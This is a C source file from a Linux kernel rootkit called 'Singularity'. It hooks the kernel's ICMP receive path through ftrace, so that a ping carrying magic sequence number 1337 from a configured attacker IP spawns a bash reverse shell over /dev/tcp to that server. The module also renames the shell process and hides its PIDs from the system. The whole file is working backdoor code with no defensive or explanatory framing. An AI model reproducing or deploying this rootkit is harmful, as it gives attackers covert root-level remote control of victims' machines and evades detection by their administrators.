#include "../include/core.h"
#include "../include/icmp.h"
#include "../include/hidden_pids.h"
#include "../ftrace/ftrace_helper.h"

#define SRV_PORT "8081"
#define PROC_NAME "singularity"
#define ICMP_MAGIC_SEQ 1337

static asmlinkage int (*orig_icmp_rcv)(struct sk_buff *);

static char validated_ip[16] = {0};
static char validated_port[6] = {0};

static notrace bool validate_ip_port(const char *ip, const char *port)
{
    u32 ip_addr;
    long port_num;
    int i;
    const char *dangerous_chars = ";|&`$(){}[]<>'\"\\";
    
    if (!ip || !port)
        return false;
    
    for (i = 0; dangerous_chars[i]; i++) {
        if (strchr(ip, dangerous_chars[i]) || strchr(port, dangerous_chars[i]))
            return false;
    }
    
    if (!in4_pton(ip, -1, (u8 *)&ip_addr, -1, NULL))
        return false;
    
    if (kstrtol(port, 10, &port_num) != 0)
        return false;
    
    if (port_num < 1 || port_num > 65535)
        return false;
    
    strncpy(validated_ip, ip, sizeof(validated_ip) - 1);
    validated_ip[sizeof(validated_ip) - 1] = '\0';
    
    strncpy(validated_port, port, sizeof(validated_port) - 1);
    validated_port[sizeof(validated_port) - 1] = '\0';
    
    return true;
}

struct revshell_work {
    struct work_struct work;
};

notrace static void spawn_revshell(struct work_struct *work)
{
    char cmd[768];
    static char *envp[] = {
        "HOME=/",
        "TERM=xterm-256color", 
        "PATH=/usr/bin:/bin:/usr/sbin:/sbin",
        NULL
    };

    char *argv[] = {"/usr/bin/setsid", "/bin/bash", "-c", NULL, NULL};
    struct subprocess_info *sub_info;
    struct task_struct *task;
    pid_t baseline_pid = 0;

    if (!validated_ip[0] || !validated_port[0]) {
        if (!validate_ip_port(YOUR_SRV_IP, SRV_PORT)) {
            kfree(container_of(work, struct revshell_work, work));
            return;
        }
    }
    
    snprintf(cmd, sizeof(cmd),
             "bash -c '"
             "PID=$$; "
             "kill -59 $PID; "
             "exec -a \"%s\" /bin/bash &>/dev/tcp/%s/%s 0>&1"
             "' &",
             PROC_NAME, validated_ip, validated_port);

    argv[3] = cmd;

    rcu_read_lock();
    for_each_process(task) {
        if (task->pid > baseline_pid)
            baseline_pid = task->pid;
    }
    rcu_read_unlock();

    sub_info = call_usermodehelper_setup(argv[0], argv, envp,
                                        GFP_KERNEL, NULL, NULL, NULL);
    if (sub_info) {
        call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
    }

    msleep(1500);

    rcu_read_lock();
    for_each_process(task) {
        if (task->pid > baseline_pid && task->mm) {
            if (strstr(task->comm, PROC_NAME) ||
                strstr(task->comm, "setsid")) {
                add_hidden_pid(task->pid);
                add_hidden_pid(task->tgid);
            }
        }
    }
    rcu_read_unlock();

    kfree(container_of(work, struct revshell_work, work));
}

notrace static asmlinkage int hook_icmp_rcv(struct sk_buff *skb)
{
    struct iphdr *iph;
    struct icmphdr *icmph;
    u32 trigger_ip;
    struct revshell_work *rw;
    
    if (!skb)
        goto out;

    iph = ip_hdr(skb);
    if (!iph || iph->protocol != IPPROTO_ICMP)
        goto out;

    icmph = icmp_hdr(skb);
    if (!icmph)
        goto out;

    if (!in4_pton(YOUR_SRV_IP, -1, (u8 *)&trigger_ip, -1, NULL))
        goto out;

    if (iph->saddr == trigger_ip && 
        icmph->type == ICMP_ECHO &&
        ntohs(icmph->un.echo.sequence) == ICMP_MAGIC_SEQ) {
        
        rw = kmalloc(sizeof(*rw), GFP_ATOMIC);
        if (rw) {
            INIT_WORK(&rw->work, spawn_revshell);
            schedule_work(&rw->work);
        }
    }

out:
    return orig_icmp_rcv(skb);
}

static struct ftrace_hook hooks[] = {
    HOOK("icmp_rcv", hook_icmp_rcv, &orig_icmp_rcv),
};

notrace int hiding_icmp_init(void)
{
    if (!validate_ip_port(YOUR_SRV_IP, SRV_PORT)) {
        printk(KERN_ERR "Singularity: Invalid IP/PORT configuration\n");
        return -EINVAL;
    }
    
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

notrace void hiding_icmp_exit(void)
{
    flush_scheduled_work();
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}
